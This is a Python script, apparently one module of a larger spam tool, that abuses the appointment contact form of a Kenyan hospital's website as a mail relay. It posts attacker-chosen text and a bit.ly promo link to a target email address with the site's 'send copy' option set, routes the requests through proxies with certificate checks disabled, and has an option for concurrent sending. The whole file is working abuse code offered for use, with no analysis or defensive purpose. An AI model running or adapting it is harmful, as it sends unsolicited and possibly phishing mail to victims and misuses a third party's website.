import logging

import requests

from module.data import Spam


class ConcreteSpam(Spam):

    def post(self, text, target, proxies) -> requests.Response:
        cookies = {
            'b8c7dae526cae6e18a37a7ef82d6f5be': '07194b9ba5c5e32ccd68662e3548281b',
        }
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'b8c7dae526cae6e18a37a7ef82d6f5be=07194b9ba5c5e32ccd68662e3548281b',
            'Origin': 'http://hemahospital.co.ke',
            'Referer': 'http://hemahospital.co.ke/index.php/appointment',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }
        data = {
            'name': text,
            'email': target,
            'message': text,
            'subject': text,
            'date': '2022/10/05 18:39',
            'send_copy': '1',
            'task': 'sendmail',
            'ctajax_modid': '122',
        }
        response = requests.post('http://hemahospital.co.ke/index.php/appointment', cookies=cookies, headers=headers,
                                 data=data, verify=False, proxies=proxies)
        return response


if __name__ == '__main__':
    success_message = '{"status":1,"message":"Your email has been sent."}'
    project_name = 'hemahospital'
    promo_link = 'bit.ly/3ygGXIR'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    result = spam.send_post()
    # spam.run_concurrently()
